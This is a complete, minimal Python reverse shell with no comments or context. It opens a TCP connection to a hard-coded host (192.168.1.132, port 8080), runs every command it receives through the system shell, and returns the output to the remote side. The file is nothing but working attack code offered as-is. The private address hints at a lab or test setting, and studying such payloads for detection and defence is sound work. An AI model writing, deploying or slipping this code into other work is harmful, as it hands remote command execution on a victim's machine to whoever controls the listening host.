import sys, subprocess, socket
H = '192.168.1.132'
P = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((H, P))
while True:
    d = s.recv(1024)
    if not d:break
    c = d.decode().strip()
    if c.strip() == "exit":
        break
    output = subprocess.getoutput(c)
    s.send(output.encode())
s.close()
